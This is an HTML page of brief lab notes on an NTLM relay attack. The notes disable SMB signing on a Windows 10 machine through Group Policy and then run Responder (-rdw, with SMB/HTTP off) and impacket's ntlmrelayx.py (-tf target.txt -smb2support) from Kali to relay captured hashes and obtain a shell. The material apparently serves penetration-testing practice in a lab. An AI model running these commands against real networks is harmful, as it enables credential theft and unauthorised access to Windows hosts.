<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>NTLM Relay</title>
</head><body><b><span style="font-size: 18pt">Configuring A User<br/>
</span></b><br/>
Create another windows 10 machine with a local user<br/>
gpmc.msc <br/>
Default Domain Policy right click edit<br/>
Computer Configuration <br/>
Policies <br/>
Windows Settings<br/>
Security Settings<br/>
Local Policies<br/>
Security Options<br/>
Microsoft Network Client: Digitally Sign Communications (always) disable this<br/>
Microsoft Network Client: Digitally Sign Communications (if server agrees) disable this<br/>
reboot the machine<br/>
<br/>
Join with the domain administrator (the server machine)<br/>
<br/>
<b><span style="font-size: 18pt"><br/>
Kali Machine<br/>
<br/>
</span></b>cd /usr/share/responder/<br/>
gedit Responder.conf for editin the responder<br/>
SMB = off<br/>
HTTP = off<br/>
<br/>
python Responder.py -I eth0 -rdw<br/>
<br/>
in a new tab of shell<br/>
locate ntlmrelayx.py<br/>
cd /opt/impacket/examples/<br/>
ls to list out the files<br/>
target.txt change the ip_address to the ip_address of the above configured machine<br/>
python ntlmrelayx.py -tf target.txt -smb2support<br/>
<br/>
<br/>
From relaying try to find the shell<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>